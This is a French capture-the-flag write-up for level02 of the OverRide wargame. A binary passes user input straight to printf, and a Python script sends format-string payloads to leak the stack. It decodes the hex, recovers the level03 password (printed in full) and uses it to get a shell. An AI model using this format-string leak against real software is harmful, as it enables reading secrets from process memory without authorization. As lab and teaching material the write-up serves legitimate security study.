# LEVEL 02

Le binaire level02 ne contien qu'une fonction **main**.

Cette fonction appelle **open** de **"/home/users/level03/.pass"** suivi d'une comparaison menant à un **exit**, puis un **fread**.

Cela nous restreint dans notre utilisation de GDB car le open ne fonctionnera pas avec nos droits, mais on sait que le **pass** est stocké quelque-part dans la **stack**.

Le programme lit 2 fois sur l'entrée standard via **fgets**.

La premiere string **login** est passée en premier argument à la fonction **printf**.

La deuxième string **passwd** est comparée au fichier **level03/.pass** et si la comparaison réussie le programme lance un **shell**.

On cherche donc a exploiter le **printf** pour afficher la stack et potentiellement trouver notre **pass**. Pour cela, on utilise le script ci-dessous pour réaliser une **format string attack** avec notre **login**:

```python
import os
import re

os.system("rm /tmp/output")
for i in range(45):
        os.system("echo '%{}$08p\ntata' | ~/level02 | grep access! >> /tmp/output".format(i))
        i +=1
f = open("/tmp/output", "r")
output = ""
for x in f:
        if x.startswith("0x"):
                tmp = re.search('(?<=x)[0-9a-f]+', x).group(0)
                output += tmp + "\n"
f.close()
strings = ""

for line in output.split("\n"):
        print(line)
        if len(line) == 16:
                decoded_line = line.decode("hex")
                #Reverting the string because it was in little indian
                decoded_line = decoded_line[::-1]
                print("decoding hexa value : ", decoded_line)
                strings += decoded_line


print("Decoded Strings = ", strings)
f = open("/tmp/decoded", "w")
f.write(strings + "\n")
```

On exécute notre script dans `/tmp` :

```bash
level02@OverRide:/tmp$ python script.py
7fffffffe4e0
000074
2a2a2a2a2a2a2a2a
('decoding hexa value : ', '********')
2a2a2a2a2a2a2a2a
('decoding hexa value : ', '********')
7fffffffe6d8
1f7ff9a08
61746174
100000000
756e505234376848
('decoding hexa value : ', 'Hh74RPnu')
45414a3561733951
('decoding hexa value : ', 'Q9sa5JAE')
377a7143574e6758
('decoding hexa value : ', 'XgNWCqz7')
354a35686e475873
('decoding hexa value : ', 'sXGnh5J5')
48336750664b394d
('decoding hexa value : ', 'M9KfPg3H')
70383024383225
2900000000
602010
7ffff7a3d7ed

('Decoded Strings = ', '****************Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H')
```

Et on obtien le **pass** : `Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H`.

```bash
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: titi
--[ Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
*****************************************
Greetings, titi!

$ cd ../level03 && cat .pass
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```

